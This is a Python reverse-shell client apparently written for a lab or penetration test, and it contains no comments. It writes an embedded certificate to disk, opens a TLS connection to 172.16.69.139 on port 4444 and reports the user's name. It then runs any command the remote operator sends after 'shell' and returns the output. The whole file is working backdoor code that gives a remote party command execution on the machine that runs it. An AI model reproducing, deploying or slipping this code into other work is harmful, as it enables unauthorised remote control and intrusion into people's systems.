
import os, subprocess, socket
import ssl

writecert = '''
-----BEGIN CERTIFICATE-----
MIIDYDCCAkigAwIBAgIJANKcPs1Sb3byMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQwHhcNMTgwMzI5MDExODQyWhcNMTgwNDI4MDExODQyWjBF
MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50
ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
CgKCAQEApe7PNpxiFzqeODO61VAL7jfz/AwrSQrphsvpU/LaPXbJMj+8TTgUViaS
YACkvtZlI0kteg2XvZCnTOvbBcFd/fLOXQLnCvA88tCVjYY34876KVOZIce+2L+W
2Zt5uoDvjrkY23jf3PiiIFtq45F+L+SPemAnAY21o3XiiJHDgpDnsTQkdmuV4TMn
ilBseUBCqtv9hXulxaqrTPRBZi4o4PWIM7kdLnPg783a0fIwDOdqllQS3babaIV1
F5dAXRgzzQDplGyrLsqmJTrNyf7xF5gV+5pJZa/mBLAEET6QiH8bnIhjVOUmpMRw
5WIkonTaCHHAl9d2H1idoNOYq/jmmQIDAQABo1MwUTAdBgNVHQ4EFgQUPn533BiA
dh/oXTY4vllK2MEJuncwHwYDVR0jBBgwFoAUPn533BiAdh/oXTY4vllK2MEJuncw
DwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEASobNbOVWLIR8x8bF
gCUdw0t+UQrpr/LPzZo0S+dxr01Q3zYH5yYInalosHYT/1LG5ExWYiMvdBCXnKTA
hKJl4NItnusP1mYxB2FZTFJMT2QSCJc1+iti0yjk1j0H2Iq6pifHJVUrVEU5xytV
FZnrA0XHgCfq7GjOehnWUWYqlqdSyLl4svC7UOUk+zdqjBwj/0duANL5FbvYstjg
xLbo0gzaL/ph8qlSlc5xs/8OQhaNpEdU8+4rbAIPmSVkSyH0yqW0gRCkb4WHrFSG
ss6jXuk9ZzUptyjtveNdCeIJBSgnm9tW7XB8NhOcdNi+YIEr5AexpRR1kVsJ8a1w
sDwVng==
-----END CERTIFICATE-----
'''

f = open('server.cert','w')
f.write(writecert)
f.close()

def connect():
    try:
        global host
        global port
        global s
        global sock

        host = "172.16.69.139"
        port = 4444
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = ssl.wrap_socket(sock,cert_reqs=ssl.CERT_REQUIRED, ca_certs='server.cert')
        print("Trying to Connect")
        s.connect((host, port))
        print("Connection Established")
        s.send(os.popen("whoami").read())
    except socket.error as msg:
        print("socket error : " + str(msg[0]))


def receive():
    receive2 = s.recv(1024)
    if receive2 == 'quit' or receive2 == 'exit':
        s.close()
    elif receive2[0:5] == 'shell':
        proc2 = subprocess.Popen(receive2[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc2.stdout.read() + proc2.stderr.read()
        args = output
    else:
        args = "Invalid Command"
    send(args)


def send(args):
    send = s.send(args)
    receive()


connect()
receive()
s.close()
